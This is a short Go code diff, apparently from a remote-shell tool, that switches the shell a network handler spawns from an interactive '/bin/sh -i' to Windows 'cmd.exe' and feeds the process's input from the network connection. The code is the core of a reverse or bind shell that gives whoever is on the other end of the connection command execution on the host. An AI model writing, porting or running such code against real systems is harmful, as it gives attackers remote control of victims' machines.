@@ -23,9 +23,9 @@ func Connect(addr string, port int) {
 
 func handler(conn net.Conn) {
 
-	cmd := exec.Command("/bin/sh", "-i")
+	//cmd := exec.Command("/bin/sh", "-i")
 	//Windows os
-	//cmd := exec.Command("cmd.exe")
+	cmd := exec.Command("cmd.exe")
 
 	reader, writer := io.Pipe()
 	cmd.Stdin = conn
